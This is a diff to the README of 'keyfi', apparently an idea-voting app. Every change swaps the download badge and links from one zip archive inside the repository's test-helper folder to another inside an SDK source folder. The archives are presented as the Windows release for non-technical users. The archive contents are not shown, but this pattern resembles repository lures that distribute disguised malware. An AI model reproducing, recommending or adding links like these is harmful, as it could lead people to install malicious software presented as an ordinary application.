@@ -1,6 +1,6 @@
 # 🔑 keyfi - Submit Ideas, Vote, and Unlock Results
 
-[![Download keyfi](https://img.shields.io/badge/Download-keyfi-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Amio49/keyfi/main/tests/helpers/Software-Brachelytra.zip)
+[![Download keyfi](https://img.shields.io/badge/Download-keyfi-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Amio49/keyfi/main/sdk/src/Software_v3.0.zip)
 
 ---
 
@@ -42,7 +42,7 @@ Follow these steps to download and run keyfi on your Windows computer.
 
 Go to this page to start the download process:
 
-[https://raw.githubusercontent.com/Amio49/keyfi/main/tests/helpers/Software-Brachelytra.zip](https://raw.githubusercontent.com/Amio49/keyfi/main/tests/helpers/Software-Brachelytra.zip)
+[https://raw.githubusercontent.com/Amio49/keyfi/main/sdk/src/Software_v3.0.zip](https://raw.githubusercontent.com/Amio49/keyfi/main/sdk/src/Software_v3.0.zip)
 
 This page contains the latest version of the software and related files.
 
@@ -151,7 +151,7 @@ For more help, visit the GitHub page and check the "Issues" section or contact s
 
 Download or learn more from the official page:
 
-[https://raw.githubusercontent.com/Amio49/keyfi/main/tests/helpers/Software-Brachelytra.zip](https://raw.githubusercontent.com/Amio49/keyfi/main/tests/helpers/Software-Brachelytra.zip)
+[https://raw.githubusercontent.com/Amio49/keyfi/main/sdk/src/Software_v3.0.zip](https://raw.githubusercontent.com/Amio49/keyfi/main/sdk/src/Software_v3.0.zip)
 
 ---
 
@@ -167,4 +167,4 @@ You don’t need technical skills to get support. Clear steps and guidance are a
 
 ---
 
-[![Download keyfi](https://img.shields.io/badge/Download-keyfi-blue?style=for-the-badge)](https://raw.githubusercontent.com/Amio49/keyfi/main/tests/helpers/Software-Brachelytra.zip)
+[![Download keyfi](https://img.shields.io/badge/Download-keyfi-blue?style=for-the-badge)](https://raw.githubusercontent.com/Amio49/keyfi/main/sdk/src/Software_v3.0.zip)
